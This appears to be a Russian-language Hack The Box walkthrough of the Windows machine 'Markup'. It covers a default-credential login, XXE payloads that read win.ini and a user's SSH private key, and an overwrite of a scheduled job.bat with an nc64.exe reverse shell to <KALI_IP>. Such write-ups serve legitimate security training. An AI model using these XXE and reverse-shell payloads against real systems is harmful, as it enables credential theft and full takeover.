# Markup (HTB)

> Платформа: Hack The Box
> ОС: Windows
> Сложность: Легко
> Результат: Administrator

---

## Цепочка Атаки

```text
Разведка
├── nmap -p- -Pn → 22 (OpenSSH for Windows 8.1), 80/443 (Apache 2.4.41 + PHP 7.2.28)
└── whatweb → MegaShopping, PHPSESSID, PHP 7.2.28

Первичный Доступ
├── index.php: default creds admin:password → 302 home.php
├── services.php: client-side JS builds XML, POST → process.php
├── process.php: DOMDocument::loadXML() without XXE protection
├── XXE: file:///c:/windows/win.ini (proof of concept)
├── XXE: file:///c:/users/daniel/.ssh/id_rsa → private key
├── ssh -i id_rsa daniel@markup.htb → daniel shell
└── user.txt

Повышение Привилегий
├── whoami /groups → BUILTIN\Users
├── icacls C:\Log-Management\job.bat → BUILTIN\Users:(F)
├── wget nc64.exe → C:\Log-Management\nc64.exe
├── overwrite job.bat → nc64.exe -e cmd.exe <KALI_IP> 4444
├── wait for scheduled task → shell as markup\administrator
└── root.txt
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Windows Server 2019 (1809) с небольшим приложением электронной коммерции MegaShopping, обслуживаемым Apache 2.4.41 с PHP 7.2.28 и OpenSSH for Windows на порту 22. Пара учётных данных по умолчанию даёт доступ к странице заказа, где клиентский JavaScript отправляет XML на бэкенд, который парсит его через `DOMDocument::loadXML()` без отключения внешних сущностей. Эта XXE-уязвимость позволяет читать произвольные файлы, включая приватный SSH-ключ локального пользователя. На самой машине находится batch-скрипт управления логами со слишком широкими ACL, который выполняется запланированной задачей от имени Administrator - его перезапись даёт shell с правами Administrator.

---

## Разведка

### Сканирование Портов

```bash
sudo nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n markup.htb
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

```bash
sudo nmap -sC -sV -Pn -n --open -p 22,80,443 markup.htb
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
```

| Порт | Сервис | Версия                                   |
|------|--------|------------------------------------------|
| 22   | SSH    | OpenSSH for Windows 8.1                  |
| 80   | HTTP   | Apache 2.4.41 (Win64) PHP 7.2.28         |
| 443  | HTTPS  | Apache 2.4.41 (Win64) PHP 7.2.28         |

Наличие `OpenSSH for_Windows` сразу выдаёт базовую платформу. Самоподписанный сертификат на 443 просрочен (`Not valid before: 2009-11-10`, `Not valid after: 2019-11-08`).

### /etc/hosts

```bash
echo "10.129.19.134 markup.htb" | sudo tee -a /etc/hosts
```

### Определение Веб-Приложения

```bash
whatweb -a 3 http://markup.htb
```

```
http://markup.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], HTML5,
HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28],
IP[10.129.19.134], OpenSSL[1.1.1c], PHP[7.2.28],
PasswordField[password], PoweredBy[Megacorp],
Title[MegaShopping], X-Powered-By[PHP/7.2.28]
```

Сайт - небольшое приложение электронной коммерции под брендом "MegaShopping". Начальная страница - форма логина (`username` / `password`, POST на `index.php`).

---

## Первичный Доступ

### Учётные Данные По Умолчанию

No CVE (custom vulnerability) - the login form accepts the default credential pair `admin:password`.

```bash
for cred in "admin:admin" "administrator:administrator" "admin:administrator" \
            "admin:password" "administrator:password"; do
  u="${cred%%:*}"; p="${cred##*:}"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -c /tmp/cj.txt -d "username=$u&password=$p" http://markup.htb/index.php)
  echo "$code  $cred"
done
```

```
200  admin:admin
200  administrator:administrator
200  admin:administrator
302  admin:password
200  administrator:password
```

Только `admin:password` возвращает 302 - успешный логин редиректит на `home.php`.

```bash
curl -s -i -c /tmp/cj.txt \
  -d "username=admin&password=password" \
  http://markup.htb/index.php | head -20
```

```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=dl2o77jvdmmtr0envgjllaq3a8; path=/
location: home.php
```

Cookie не имеет ни `HttpOnly`, ни `Secure` - вторичная слабость, о которой стоит упомянуть, но для эксплуатации она не требуется.

### Перечисление Приложения

После логина основная навигация содержит: `Home`, `About`, `Products`, `Order` (→ `services.php`), `Contact`. На странице `services.php` есть HTML-комментарий:

```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

Это утечка имени пользователя (`daniel`) - полезно позже для XXE-путей.

### Форма Заказа - XML на Стороне Клиента

Форма `Order in Bulk` на `services.php` отправляет XML, полностью сгенерированный в JavaScript:

```javascript
function getXml() {
    var elements = document.forms.myForm.elements;
    var xmlTemplate = '<?xml version = "1.0"?><order>';
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        if (element.tagName == "INPUT") {
            xmlTemplate = xmlTemplate + '<' + element.name + '>' +
                          element.value + '</' + element.name + '>';
        }
    }
    var e = document.getElementById("items");
    var item = e.options[e.selectedIndex].value;
    xmlTemplate = xmlTemplate + '<item>' + item + '</item>' +
                  '<address>' + document.getElementById('address').value + '</address></order>';
    var http = new XMLHttpRequest();
    http.open('POST', 'process.php', true);
    http.setRequestHeader('Content-Type', 'text/xml');
    http.send(xmlTemplate);
}
```

Сгенерированный XML имеет следующую структуру:

```xml
<?xml version = "1.0"?><order><quantity>...</quantity><item>...</item><address>...</address></order>
```

### Обнаружение XXE

No CVE (custom vulnerability) - XML External Entity (CWE-611) via `DOMDocument::loadXML()` without `libxml_disable_entity_loader(true)`; allows reading arbitrary files.

POST на `process.php` без тела возвращает PHP-предупреждения, раскрывающие используемый парсер:

```bash
curl -s -b /tmp/cj.txt -X POST http://markup.htb/process.php
```

```
Warning: DOMDocument::loadXML(): Empty string supplied as input
  in C:\xampp\htdocs\process.php on line 11
Warning: simplexml_import_dom(): Invalid Nodetype to import
  in C:\xampp\htdocs\process.php on line 12
Notice: Trying to get property 'quantity' of non-object
  in C:\xampp\htdocs\process.php on line 13
```

Это подтверждает, что `process.php` парсит XML напрямую через `DOMDocument::loadXML()`, а затем читает `->quantity`, `->item`, `->address` через SimpleXML. Разрешение внешних сущностей оставлено включённым.

Proof of concept - чтение `C:\windows\win.ini`:

```bash
cat > /tmp/xxe-test.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-test.xml http://markup.htb/process.php
```

```
Your order for ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Приватный SSH-Ключ через XXE

Имя пользователя `daniel` (утечка в HTML-комментарии) плюс соглашения Windows дают прямой путь к OpenSSH-ключу пользователя:

```bash
cat > /tmp/xxe-ssh.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-ssh.xml http://markup.htb/process.php
```

```
Your order for -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (truncated) ...
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Сохрани возвращённый ключ в `id_rsa` (убери префикс `Your order for ` и суффикс ` has been processed`), затем выставь корректные права:

```bash
sed -e 's/^Your order for //' -e 's/ has been processed$//' /tmp/xxe-ssh-out.txt > /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh-keygen -l -f /tmp/id_rsa
```

```
3072 SHA256:OrvhzyMF1OAj02guQWL1vg2TSovi5XIQONohNGrkRzQ daniel@Entity (RSA)
```

### SSH-Вход

```bash
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no daniel@markup.htb
```

```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

```cmd
whoami
```

```
markup\daniel
```

```cmd
hostname
```

```
MarkUp
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Флаг Пользователя

```cmd
type C:\Users\daniel\Desktop\user.txt
```

```
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Повышение Привилегий

No CVE (custom vulnerability) - incorrect permission assignment (CWE-732): `BUILTIN\Users` has Full Control over `job.bat`, which is executed by an Administrator scheduled task; overwriting the script yields an Administrator shell.

### Локальное Перечисление

```cmd
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Никаких интересных привилегий (`SeImpersonatePrivilege` отсутствует). `daniel` входит в `BUILTIN\Users` и кастомную группу `MARKUP\Web Admins`.

```cmd
whoami /groups
```

```
Group Name                             Type             SID
====================================== ================ ==============================================
Everyone                               Well-known group S-1-1-0
MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001
BUILTIN\Remote Management Users        Alias            S-1-5-32-580
BUILTIN\Users                          Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11
NT AUTHORITY\This Organization         Well-known group S-1-5-15
NT AUTHORITY\Local account             Well-known group S-1-5-113
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

### Скрипт Log-Management

```cmd
dir C:\
```

```
 Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
09/15/2018  12:12 AM    <DIR>          PerfLogs
07/28/2021  02:01 AM    <DIR>          Program Files
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
```

Каталог `Log-Management` выделяется (кастомный, не дефолтный для Windows):

```cmd
dir C:\Log-Management
```

```
 Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
```

```cmd
type C:\Log-Management\job.bat
```

```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

Скрипт вызывает `wevtutil.exe` (Windows Event Utility) для очистки журналов событий - операция, требующая прав Administrator. Проверка `bcdedit` в начале - это защита: если скрипт запущен не от Administrator, `bcdedit` возвращает `Access`, и скрипт уходит на `noAdmin`.

### Проверка Прав

```cmd
icacls C:\Log-Management\job.bat
```

```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Users:(I)(RX)
```

Первый ACE - явный (не унаследованный) и даёт `BUILTIN\Users` Full Control (`F`) над скриптом. Поскольку `daniel` входит в `BUILTIN\Users`, он может перезаписать `job.bat`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

В сочетании с тем, что скрипт периодически выполняется запланированной задачей от Administrator (процессы `wevtutil.exe`, замеченные автором машины, и сам смысл скрипта очистки логов на сервере), это прямая эскалация привилегий: заменяем `job.bat` на launcher reverse-shell и ждём.

### Загрузка Payload

На Kali скачай Windows-бинарь `netcat` и отдай его по HTTP:

```bash
cd /tmp
wget -q https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
python3 -m http.server 80
```

На цели, от `daniel`:

```cmd
cd C:\Log-Management
powershell -c "Invoke-WebRequest -Uri http://<KALI_IP>/nc64.exe -OutFile C:\Log-Management\nc64.exe"
dir nc64.exe
```

```
 Directory of C:\Log-Management

10/12/2026  03:02 PM            45,272 nc64.exe
```

### Перезапись job.bat

Запусти listener на Kali:

```bash
nc -lvnp 4444
```

Перезапиши скрипт на launcher reverse-shell. Замечание: `Set-Content` из PowerShell с `-Encoding ASCII` избегает UTF-16 BOM, который вносит сырой `echo > file` из PowerShell.

```cmd
powershell -c "Set-Content -Path C:\Log-Management\job.bat -Value 'C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444' -Encoding ASCII"
type C:\Log-Management\job.bat
```

```
C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444
```

### Shell от Administrator

В течение нескольких минут запланированная задача срабатывает и перезаписанный скрипт соединяется обратно:

```
connect to [<KALI_IP>] from (UNKNOWN) [10.129.19.134] 49761
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
markup\administrator
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Root Флаг

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Флаги

| Флаг | Значение       |
|------|----------------|
| User | `<USER_FLAG>`  |
| Root | `<ROOT_FLAG>`  |

---

## Ключевые Выводы

- **Учётные данные по умолчанию - всё ещё способ закрепиться.** `admin:password` на публичном логине - повторяющаяся тема HTB; небольшой список (`admin`, `administrator` × `admin`, `password`, `123456`) стоит попробовать до чего-либо более сложного.
- **Читай исходники.** HTML-комментарий `<!-- Modified by Daniel : UI-Fix-9092-->` был единственной подсказкой, что существует пользователь `daniel`; без него угадывание пути к SSH-ключу - чистая удача.
- **XXE - это примитив чтения файлов, а не только SSRF-гаджет.** На Windows `file:///c:/...` работает напрямую и может эксфильтровать ключи, учётные данные и конфигурационные файлы. Проверяй используемый парсер (`DOMDocument::loadXML()` здесь) и отключены ли внешние сущности.
- **PHP-предупреждения выдают путь на бэкенде.** Предупреждение `DOMDocument::loadXML(): Empty string supplied as input in C:\xampp\htdocs\process.php on line 11` подтвердило и парсер, и webroot.
- **Эскалация через ACL - обычное дело на Windows.** `icacls <file>` - первая проверка для любого кастомного скрипта вне `C:\Windows`; `BUILTIN\Users:(F)` на файле, исполняемом привилегированным процессом, - немедленный выигрыш.
- **Используй PowerShell `Set-Content -Encoding ASCII` для batch-файлов Windows.** Запись через `echo > file` из PowerShell даёт UTF-16 с BOM, с которым `cmd.exe` работает неправильно; ASCII сохраняет файл простым.
- **Запланированные задачи - надёжный триггер.** После подмены скрипта эксплойт пассивен - жди задачу и лови shell.